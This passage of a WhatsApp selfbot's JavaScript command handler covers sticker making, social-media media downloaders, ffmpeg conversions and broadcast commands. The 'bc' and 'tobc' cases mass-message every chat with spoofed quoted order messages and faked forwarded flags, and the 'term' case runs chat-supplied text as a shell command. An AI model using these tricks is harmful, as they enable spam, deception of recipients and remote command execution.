Haikal.sendMessage(from, thumb, MessageType.image, {quoted: ikal, caption: `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${p.status}\n➸ *Prefix :* Multi Prefix\n\n`})
}
              break
    case 'sticker': 
    case 'stiker':
    case 'sg':
    case 's':
            if ((isMedia && !kal.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                freply('error')
                })
                .on('end', function () {
                console.log('Finish')
                Haikal.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: ikal})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && kal.message.videoMessage.seconds < 11 || isQuotedVideo && kal.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
                const media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            freply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            freply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            Haikal.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: ikal})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
                freply(`Kirim gambar dengan caption🔥➥ ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
            }
            break               
			break
// Tiktok mp4
case 'ttmp4':
if (isBan) return reply(mess.ban)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:ikal, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, anu, 'Done!')
})
break
// Tiktok mp3
case 'ttmp3':
if (isBan) return reply(mess.ban)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.ttdownloader(lin).then(async (res) => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:ikal, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
Haikal.sendMessage(from, khs, audio, {quoted:ikal, mimetype:'audio/mp4', filename:'Haikalgans.mp3', ptt:true})
})
break
    case 'toimg':
			if (!isQuotedSticker) return freply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
			freply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await Haikal.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return freply('Yah gagal, coba ulangi ^_^')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'NIH')
			fs.unlinkSync(ran)
			})
			break
	case 'setreply':
	case 'setfake':
                        if (!kal.key.fromMe && !isOwner) return
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			freply(` Succes Mengganti Conversation Fake : ${q}`)
			break
	case 'setfakeimg':
                if (!kal.key.fromMe && !isOwner) return
        	if ((isMedia && !kal.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
			delb = await Haikal.downloadMediaMessage(boij)
			fs.writeFileSync(Mfake, delb)
			freply(' Sukses')
        	} else {
            freply(`Kirim gambar dengan caption🔥➥ ${prefix}sethumb`)
          	}
			break	
	case 'setthumb':
                if (!kal.key.fromMe && !isOwner) return
	        if ((isMedia && !kal.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
			delb = await Haikal.downloadMediaMessage(boij)
			fs.writeFileSync(Mthumb, delb)
			freply(' Sukses')
        	} else {
            freply(`Kirim gambar dengan caption🔥➥ ${prefix}sethumb`)
          	}
			break
case 'emoji':
if (!q) return fakegroup('emojinya?')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[4].url}`
sendStickerFromUrl(from,`${teks}`)	
console.log(teks)
})
break
    case 'brainly':
			if (args.length < 1) return freply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			Haikal.sendMessage(from, teks, text,{quoted:ikal,detectLinks: false})                        
            })              
			break
	case 'term':
                        if (!kal.key.fromMe && !isOwner) return
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			freply(stdout)
			}
			})
		    break 
    case 'join':
    if (!kal.key.fromMe) return fakestatus('APASIH')
            if (args.length < 1) return freply('Linknya?')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return freply('pastikan itu link https://whatsapp.com/')
let { size } = await Haikal.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if (size < 50) {
            freply('Member Lo Dikit Jadi Bot Gk Mau Join, minimal member harus 50 orang')
            } else if (size > 50) {
             try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return freply(mess.Iv)
            var codeInvite = cos.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await Haikal.acceptInvite(codeInvite)
            fakestatus(' Sukses')
            } catch {
            fakegroup('LINK ERROR!')
            }
            } else {
            freply('Error!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return freply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
    case 'runtime':
    case 'test':
            teks = `${kyun(run)}\n\n「 𝗕𝗔𝗜𝗟𝗘𝗬𝗦 𝗦𝗘𝗟𝗙𝗕𝗢𝗧 」`
            freply(teks)
            break              					
	case 'speed':
	case 'ping':			
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			freply(pingnya)
			})
			break  
    case 'totag':
            if ((isMedia && !kal.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !kal.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !kal.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !kal.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: ikal
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          freply(`reply gambar/sticker/audio/video dengan caption🔥➥ ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !kal.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
            owgi = await Haikal.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            freply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !kal.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kal
            owgi = await Haikal.downloadMediaMessage(boij)
            res = await upload(owgi)
            freply(res)
            } else {
            freply('kirim/reply gambar/video')
            }
            break	
                  case 'tinyurl':
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
freply(`${anu.data}`)
} catch (e) {
emror = String(e)
freply(`${e}`)
}
break
case 'tobc':			
if (!kal.key.fromMe) return fakestatus('APASIH')
				if (args.length < 1) return freply('Teksnya?')
				var bc = body.slice(6)
					Haikal.updatePresence(from, Presence.composing)
					anu = await Haikal.chats.all()
					if (isMedia && !kal.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, audio, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, mimetype: 'audio/mp3',  ptt: true })
						}
						} else if (isMedia && !kal.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `${bc}`, orderTitle: `${bc}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          freply('reply sticker/audio')
							}
			break
case 'bc':
if (!kal.key.fromMe) return fakestatus('APASIH')
					Haikal.updatePresence(from, Presence.composing)					
					if (args.length < 1) return freply('Teksnya?')
					anu = await Haikal.chats.all()
					if (isMedia && !kal.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						freply(` Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !kal.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						freply(` Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !kal.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kal
						buff = await Haikal.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Haikal.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						freply(` Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						freply(` Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    igdl(args[0])
	    .then(async(result) => {
            for (let ink of result.url_list)	{
            if (ink.includes('.mp4')){
            const igvdl = await getBuffer(ink)	
	    Haikal.sendMessage(from,igvdl,video,{mimetype:'video/mp4',quoted:ikal,caption:'Nih'})
            } else if (ink.includes('.jpg')){
            const igpdl = await getBuffer(ink)
            Haikal.sendMessage(from,igpdl,image,{mimetype:'image/jpeg',quoted:ikal,caption:'Nih'})
	    }
            }
	    })
	    break
case 'asupan1':
			Haikal.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				Haikal.sendMessage(from, asupan, video, {quoted: ikal, caption: '```ASUPAN NIH:V```'})
				break        
case 'asupan2':
			Haikal.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan2.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				Haikal.sendMessage(from, asupan, video, {quoted: ikal, caption: '```ASUPAN NIH:V```'})
				break 				                                 
    case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
					// MAKER SOCIAL
case 'tovoice':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, MessageType.audio, {quoted: ikal, mimetype: 'audio/mp4', ptt:true})
            fs.unlinkSync(ran)
            })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: ikal })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ikal })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ikal })
            fs.unlinkSync(ran)
            })
            break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await Haikal.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            Haikal.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: ikal })
            fs.unlinkSync(ran)
            })
            break
case 'igstalk':
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
case 'fbmp4':
if (args.length < 1) return freply('Link?')
lin = args[0]
freply(mess.wait)
hx.fbdown(lin).then(res => {
console.log('[ FACEBOOK ] downloader')
Anu = res.HD
fto = Mthumb

Haikal.sendMessage(from, fto, image, {quoted:ikal, caption:`*FACEBOOK MP4*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
case 'fbmp3':
if (args.length < 1) return freply('Link?')
lin = args[0]
freply(mess.wait)
hx.fbdown(lin).then(async (res) => {
console.log('[ FACEBOOK ] downloader')
Anu = res.HD
fto = Mthumb

Haikal.sendMessage(from, fto, image, {quoted:ikal, caption:`*FACEBOOK MP3*\n\n•> Normal : ${res.Normal_video}\n•> Hd : ${res.HD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
Haikal.sendMessage(from, khs, audio, {quoted:ikal, mimetype:'audio/mp4', filename:'Haikal.mp3', ptt:true})
})
break
case 'ytmp3':
if (isBan) return reply(mess.ban)
if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply(mess.error.Iv)
reply(mess.wait)
try {
yta(args[0])
.then(async(res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async(a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
const captions = `*YT MP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Please wait, the media file is being sent it may take a few minutes_`
buff = await getBuffer(dl_link)
fak = await getBuffer(thumb)
Haikal.sendMessage(from, fak, MessageType.image, {quoted:ikal, caption:captions})
Haikal.sendMessage(from, buff, MessageType.audio, {
"contextInfo": {
mimetype: 'audio/mp4',
text: 'HAIKAL MODS',
"forwardingScore": 1000000000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `${title}`,
"body": `${title}`,
"previewType": "PHOTO",
"thumbnailUrl": `${thumb}`,
"thumbnail": fak,
"sourceUrl": args[0]
}}, quoted:ikal, ptt:true
}).catch(() => reply(mess.error.api))
})
})
} catch (err) {
reply(mess.error.api)
}
break
	case 'play':
			if (args.length === 0) return freply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            freply(mess.wait)
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
                        const captions = `*YT MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait, the media file is being sent it may take a few minutes_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => freply('error'))
                        })                
                        })
                        } catch (err) {
                        freply(mess.error.api)
                        }
                   break  
        case 'video':
        case 'ytmp4':
            if (args.length === 0) return freply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
            freply(mess.wait)
            aramas = await yts(srch);
            aramat = aramas.all 
            var mulaikah = aramat[0].url                            
                  try {
                    ytv(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*YT VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the form of a link_`)
                        const captions = `*YT VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait, the media file is being sent it may take a few minutes_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => freply('error'))
                        })                
                        })
                        } catch (err) {
                        freply(mess.error.api)
                        }
                   break      
                   	case 'ytsearch':
			if (args.length < 1) return freply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await Haikal.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
// Twitter Downloader ( HW MODS WA )
case 'twmp4':
if (args.length < 1) return freply('Link?')
lin = args[0]
freply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:ikal, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
// Twitter Downloader ( HW MODS WA )
case 'twmp3':
if (args.length < 1) return freply('Link?')
lin = args[0]
freply(mess.wait)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = Mthumb
